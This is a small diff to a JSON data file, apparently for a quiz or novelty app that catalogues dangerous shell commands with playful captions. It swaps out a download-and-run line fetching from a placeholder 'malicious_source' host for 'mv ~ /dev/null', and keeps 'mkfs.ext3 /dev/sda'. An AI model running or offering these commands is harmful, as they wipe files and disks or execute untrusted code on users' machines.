@@ -12,14 +12,14 @@
             "description": "Wipe Root!"
         },
         "3": {
-            "img": "img/virus.jpg",
-            "text": "wget http://malicious_source -O- | sh",
-            "description": "Download and run a virus!"
+            "img": "img/blackhole.jpg",
+            "text": "mv ~ /dev/null",
+            "description": "Bye personal files!"
         },
         "4": {
             "img": "img/hard-drive.jpg",
             "text": "mkfs.ext3 /dev/sda",
-            "description": "Get a brand new hard drive!"
+            "description": "Get a brand new HDD!"
         }
     },
     "questions": [
